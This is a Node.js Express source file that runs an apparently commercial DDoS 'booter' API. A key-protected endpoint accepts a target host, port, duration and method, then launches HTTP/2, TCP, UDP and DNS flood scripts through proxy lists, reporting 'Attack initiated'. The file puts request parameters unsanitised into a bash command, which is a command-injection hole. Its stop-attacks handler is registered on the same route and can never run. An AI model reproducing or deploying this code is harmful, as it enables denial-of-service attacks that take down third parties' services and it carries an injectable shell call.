const express = require('express');
const { spawn } = require('child_process');
const app = express();
const port = 2206;

const methods = {
  "H2-HOLD": 'h2-hold.js',
   'R9': 'r9.js',
   "H2-GEC": 'H2GEC.js',
   'FLUTRA': 'FLUTRA.js',
   'FLOODH': 'floodh.js',
   'SPACE': 'space.js',
   'tcp-gbps': 'tcp.js',
   'udp-gbps': 'udp.js',
   'dns': 'dns.js',
};

// Daftar proses yang berjalan
const activeProcesses = new Map();

const generateCommand = (method, host, port, time) => {
    switch (method) {
        case 'H2-HOLD':
            return `cd /root/api/ && node h2-hold.js ${host} ${time} 3 3 proxy.txt`;
        case 'FLOODH':
            return `cd /root/api/ && node floodh.js POST ${host} ${time} 5 32 proxy.txt`;
        case 'SPACE':
            return `cd /root/api/ && node space.js ${host} ${time} 3 3 proxy.txt`;
        case 'R9':
            return `cd /root/api/ && node R9.js ${host} ${time} 32 5 proxy.txt`;
        case 'H2-GEC':
            return `cd /root/api/ && node H2GEC.js ${host} ${time} 32 5 proxy.txt`;
        case 'FLUTRA':
            return `cd /root/api/ && node FLUTRA.js ${host} ${time} 32 5 proxy.txt`;
        case 'tcp-gbps':
            return `cd /home/container/api/ && node tcp.js ${host} ${port} ${time}`;   
        case 'dns':
            return `cd /home/container/api/ && node dns.js ${host} 22 ${time}`;
        case 'udp-gbps':
            return `cd /home/container/api/ && node udp.js ${host} ${port} ${time}`;
        default:
            return `cd /home/container/api/ && node ${methods[method]} ${host} ${port} ${time}`;
    }
};

app.get('/api/renzuis', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (key !== 'renzuis') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!methods[method]) {
        return res.status(400).json({ error: 'Unknown method' });
    }

    res.json({
        status: 'Attack initiated',
        host: host,
        port: port,
        time: time,
        method: method,
    });

    const command = generateCommand(method, host, port, time);
    const process = spawn('bash', ['-c', command], { detached: true });

    process.stdout.on('data', (data) => {
        console.log(`Stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`Stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`Process exited with code ${code}`);
    });

    // Simpan proses yang sedang berjalan
    activeProcesses.set(process.pid, process);
});

app.get('/api/renzuis', (req, res) => {
    const key = req.query.key;

    if (key !== 'renzuis') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    activeProcesses.forEach((process, pid) => {
        process.kill();
        activeProcesses.delete(pid);
    });

    res.json({ status: 'All attacks stopped.' });
});

app.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
});
